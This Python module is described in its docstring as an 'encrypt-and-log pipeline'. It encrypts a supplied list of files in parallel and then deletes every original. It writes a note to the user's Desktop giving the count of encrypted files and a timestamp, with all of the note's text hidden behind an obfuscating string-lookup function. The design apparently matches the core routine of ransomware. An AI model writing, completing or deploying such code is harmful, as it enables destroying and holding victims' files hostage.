"""Shared encrypt-and-log pipeline for the ``ade._u_*`` entries."""
from __future__ import annotations

from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path

from ..link._fds_jm import sec
from ..util.need import utils
from . import ad_t


def encrypt_log(result_list, header) -> bool:
    desktop = Path.home() / sec("tm_jm_jg_zm_ds")
    de = desktop if desktop.exists() else Path.home() / sec("tm_jm_jg_zm")
    output_file = de / (sec("tm_jm_jg") + sec("a_ke_t_s_4k"))
    if not output_file.parent.exists():
        output_file.parent.mkdir(parents=True, exist_ok=True)
    if not output_file.exists():
        output_file.touch()
    with open(output_file, "w", encoding="utf-8") as handle:
        handle.write(str(header).rstrip("\n") + "\n")
        handle.write("--------------------------------------------------\n")

    def encrypt_one(o_f: str):
        s = o_f
        try:
            ad_t.ad_t(o_f)
            e_f = o_f
        except Exception:
            e_f = None
        return s, e_f

    def delete_one(file_path: str) -> None:
        try:
            utils.safe_del_file(file_path)
        except Exception:
            pass

    files = list(result_list or ())
    o_res: list[str] = []
    e_res: list[str] = []
    workers = min(64, max(1, len(files)))
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(encrypt_one, path) for path in files]
        for future in as_completed(futures):
            try:
                source, encrypted = future.result()
            except Exception:
                continue
            o_res.append(source)
            if encrypted:
                e_res.append(encrypted)
    for path in o_res:
        delete_one(path)

    with open(output_file, "a", encoding="utf-8") as handle:
        handle.write(sec("tm_jm_jg_fil") + "：" + str(len(e_res)) + "\n")
        handle.write(
            sec("tm_jm_jg_fil_t")
            + "："
            + datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            + "\n"
        )
        handle.write(sec("tm_jm_jg_mu") + "： " + str(len(e_res)) + "\n")
        handle.write(sec("tm_sk_de_v_mu") + "\n")
        handle.write(sec("tm_sdf_sd_smu") + "： " + str(header) + "\n")
    return bool(e_res)
